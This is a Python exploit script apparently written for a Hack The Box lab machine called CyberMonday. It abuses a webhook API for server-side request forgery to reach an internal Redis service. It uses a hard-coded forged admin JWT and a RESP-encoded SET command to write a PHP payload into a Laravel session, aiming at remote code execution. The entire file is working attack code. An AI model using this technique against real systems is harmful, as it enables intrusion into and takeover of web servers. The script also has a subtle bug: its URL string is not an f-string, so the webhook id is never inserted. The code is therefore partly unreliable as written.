import requests

#uuid of the webhook we create to send requests
webhook_uuid = "63a0b373-70c8-4469-885b-a5585a004e38"

#function to RESP ENCODE da payload
def resp_encode_command(command):
    parts = command.split(' ', 2)  # Splitting into three parts
    encoded_command = f"*{len(parts)}\r\n"
    for part in parts:
        encoded_command += f"${len(part)}\r\n{part}\r\n"
    return encoded_command

#files to get the juicy 360 noscope hacking shit
with open("session-id.txt", "r") as f:
	session = f.read().strip()

with open ("php-payload.txt", "r") as f:
	payload = f.read().strip()

command = f"SET laravel_session:{session} {payload}"
encoded_command = resp_encode_command(command)

url = "http://webhooks-api-beta.cybermonday.htb/webhooks/{webhook_uuid}"

headers = {
    "Content-Type": "application/json",
    "x-access-token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJyaXZhbCIsInJvbGUiOiJhZG1pbiJ9.ilvEruwwf2RjKXuQx6ynbYYVAhv1rpu-2146QgMdjCs"
}

payload = {
    "url": "http://redis:6379",
    "method": encoded_command
    }

print("[+] getting ready to send the payload")

#we print the payload for having some verbosity in the script
print(payload)

response = requests.post(url, json=payload, headers=headers)

print("Status Code:", response.status_code)
print("Response:", response.text)
